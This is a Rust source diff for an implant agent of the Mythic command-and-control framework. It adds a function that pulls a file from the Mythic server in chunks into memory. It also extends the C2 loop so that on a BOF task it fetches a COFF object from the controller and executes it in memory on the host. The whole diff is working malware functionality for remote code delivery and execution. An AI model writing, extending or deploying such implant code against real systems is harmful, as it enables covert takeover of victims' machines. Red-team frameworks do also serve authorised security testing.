@@ -899,6 +899,78 @@ pub fn mythic_upload(
     }
 }
 
+/// Fetches the raw bytes of a Mythic file by id using the chunked upload
+/// protocol, without writing to disk. Used by the bof command to pull the
+/// COFF object into memory.
+#[allow(clippy::too_many_arguments)]
+pub fn fetch_file_bytes(
+    client: &ureq::Agent,
+    base_url: &str,
+    uri: &str,
+    callback_id: &str,
+    key: &[u8; 32],
+    task_id: &str,
+    file_id: &str,
+) -> Result<Vec<u8>, String> {
+    use base64::{engine::general_purpose::STANDARD, Engine as _};
+    if file_id.is_empty() {
+        return Err("missing file id".into());
+    }
+    let req = TaskResponse {
+        task_id: task_id.to_string(),
+        completed: false,
+        user_output: None,
+        status: None,
+        download: None,
+        upload: Some(UploadRequest {
+            chunk_size: CHUNK_SIZE,
+            file_id: file_id.to_string(),
+            chunk_num: 1,
+            full_path: None,
+        }),
+        processes: None,
+        file_browser: None,
+    };
+    let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
+    let first = match resp.first() {
+        Some(e) if e.status == "success" => e,
+        Some(e) => return Err(format!("fetch failed: {}", e.error)),
+        None => return Err("no response from Mythic".into()),
+    };
+    let total_chunks = first.total_chunks;
+    let mut data = STANDARD
+        .decode(&first.chunk_data)
+        .map_err(|e| format!("chunk 1 decode error: {}", e))?;
+    for chunk_num in 2..=total_chunks {
+        let req = TaskResponse {
+            task_id: task_id.to_string(),
+            completed: false,
+            user_output: None,
+            status: None,
+            download: None,
+            upload: Some(UploadRequest {
+                chunk_size: CHUNK_SIZE,
+                file_id: file_id.to_string(),
+                chunk_num,
+                full_path: None,
+            }),
+            processes: None,
+            file_browser: None,
+        };
+        let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
+        match resp.first() {
+            Some(e) if e.status == "success" => {
+                let d = STANDARD
+                    .decode(&e.chunk_data)
+                    .map_err(|e| format!("chunk {} decode error: {}", chunk_num, e))?;
+                data.extend_from_slice(&d);
+            }
+            _ => return Err(format!("chunk {} fetch failed", chunk_num)),
+        }
+    }
+    Ok(data)
+}
+
 // Keep simple versions for non-networked tests / fallback
 pub fn download_file(path: &str) -> String {
     if path.is_empty() {
@@ -984,15 +1056,17 @@ where
     }
 }
 
-pub fn run_c2_loop<F>(
+pub fn run_c2_loop<F, B>(
     callback: &str,
     implant_secret: &str,
     payload_uuid: &str,
     callback_uri: &str,
     reg: RegisterInfo,
     dispatch: F,
+    bof_exec: B,
 ) where
     F: Fn(&str, &str) -> CommandOutput,
+    B: Fn(&[u8], &str, &str) -> String,
 {
     use zeroize::Zeroize;
 
@@ -1230,6 +1304,44 @@ pub fn run_c2_loop<F>(
                 continue;
             }
 
+            // BOF tasks need network access to fetch the COFF bytes from the
+            // Mythic file store, then run the platform loader. Handle here.
+            if task.command_hash == cmds::BOF {
+                let file_id = extract_param(&task.parameters, "bof");
+                let entrypoint = extract_param(&task.parameters, "entrypoint");
+                let args_spec = extract_param(&task.parameters, "args");
+                let output = run_safely(&task.id, || {
+                    CommandOutput::text(match fetch_file_bytes(
+                        &client,
+                        &base,
+                        uri,
+                        &callback_id,
+                        &encryption_key,
+                        &task.id,
+                        &file_id,
+                    ) {
+                        Ok(bytes) => bof_exec(&bytes, &entrypoint, &args_spec),
+                        Err(e) => format!("[-] bof fetch failed: {}", e),
+                    })
+                })
+                .text;
+                let is_error = output.starts_with("[-]");
+                responses.push(TaskResponse {
+                    task_id: task.id.clone(),
+                    completed: true,
+                    user_output: Some(output),
+                    status: if is_error {
+                        Some("error".to_string())
+                    } else {
+                        None
+                    },
+                    download: None,
+                    upload: None,
+                    processes: None,
+                    file_browser: None,
+                });
+                continue;
+            }
             let result = run_safely(&task.id, || dispatch(&task.command, &task.parameters));
             let is_error = result.text.starts_with("[-]");
             responses.push(TaskResponse {
